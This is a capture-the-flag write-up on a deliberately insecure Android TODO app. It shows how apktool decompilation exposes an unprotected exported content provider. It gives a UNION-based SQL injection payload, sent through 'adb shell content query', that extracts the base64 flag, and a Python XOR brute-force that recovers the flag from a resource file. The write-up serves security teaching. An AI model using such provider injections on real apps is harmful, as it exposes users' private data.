# Unsecure TODO

## Challenge Description

> Our highly skilled android devs want to deploy the app, however our Clanker security tools detects CWE-926 & CWE-564.

**Points:** 500  
**Category:** Reverse Engineering (Android)

## Overview

This challenge involves analyzing an insecure Android TODO application (`unsecure-todo.apk`) that contains two critical security vulnerabilities:

| CWE | Name | Impact |
|-----|------|--------|
| **CWE-926** | Improper Export of Android Application Components | Any app can access the content provider |
| **CWE-564** | SQL Injection: Hibernate | Allows extraction of sensitive data |

---

## Analysis

### Step 1: APK Decompilation

First, I decompiled the APK using `apktool`:

```bash
apktool d unsecure-todo.apk -o decompiled
```

### Step 2: AndroidManifest.xml Analysis

Examining the manifest reveals the first vulnerability:

```xml
<provider 
    android:authorities="com.cit.ideh_unsecure_todo.leaky" 
    android:exported="true" 
    android:name="com.cit.ideh_unsecure_todo.LeakyProvider"/>
```

> [!WARNING]
> **CWE-926**: The `LeakyProvider` content provider is exported (`android:exported="true"`) with **no permission protection**. This means any malicious app on the device can query this provider and access its data.

### Step 3: Source Code Analysis

#### LeakyProvider.smali

The `query()` method in `LeakyProvider` contains a critical SQL injection vulnerability:

```kotlin
// Reconstructed Kotlin code from smali
fun query(uri: Uri, ...): Cursor {
    val q = uri.getQueryParameter("q") ?: ""
    
    // VULNERABLE: Direct string concatenation in SQL query
    val sql = "SELECT _id, title, body FROM notes WHERE title LIKE '%$q%';"
    
    return db.rawQuery(sql, null)
}
```

> [!CAUTION]
> **CWE-564**: User input is directly concatenated into the SQL query without sanitization, enabling SQL injection attacks.

#### FlagDb.smali

The database helper creates two tables:

```sql
-- Regular notes table
CREATE TABLE notes(
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    body TEXT NOT NULL
)

-- Secret table containing the flag
CREATE TABLE secrets(
    _id INTEGER PRIMARY KEY AUTOINCREMENT,
    flag_b64 TEXT NOT NULL
)
```

The flag is loaded from `res/raw/seed.bin`, base64 encoded, and stored in the `secrets` table:

```kotlin
val flagBytes = resources.openRawResource(R.raw.seed).readBytes()
val flagB64 = Base64.encodeToString(flagBytes, Base64.NO_WRAP)
db.execSQL("INSERT INTO secrets(flag_b64) VALUES(?)", arrayOf(flagB64))
```

---

## Exploitation

### Method 1: SQL Injection via Content Provider

If running the app on a device/emulator, you could exploit both vulnerabilities:

```bash
# Query the exported provider with SQL injection
adb shell content query \
    --uri "content://com.cit.ideh_unsecure_todo.leaky?q=' UNION SELECT _id, flag_b64, flag_b64 FROM secrets--"
```

This payload:
1. Closes the original `LIKE` clause with `'`
2. Uses `UNION` to merge results from the `secrets` table
3. Comments out the rest with `--`

### Method 2: Static Analysis (Direct Flag Extraction)

Since the flag originates from a resource file, we can extract it directly:

```bash
# View the seed file
cat decompiled/res/raw/seed.bin
# Output: 13 1E 1F 12 21 3B 34 3E 28 6A 33 3E 05 2A 28 35 2C 6B 3E 69 28 29 05 3B 28 3F 05 39 6A 6A 36 27
```

The data appears to be XOR-encrypted hex values. Testing different XOR keys:

```python
hex_str = "13 1E 1F 12 21 3B 34 3E 28 6A 33 3E 05 2A 28 35 2C 6B 3E 69 28 29 05 3B 28 3F 05 39 6A 6A 36 27"
data = bytes.fromhex(hex_str.replace(' ', ''))

for key in range(256):
    decoded = bytes([b ^ key for b in data])
    try:
        result = decoded.decode('ascii')
        if result.isprintable():
            print(f'XOR key {key}: {result}')
    except:
        pass
```

**Result with XOR key 90:**
```
IDEH{andr0id_prov1d3rs_are_c00l}
```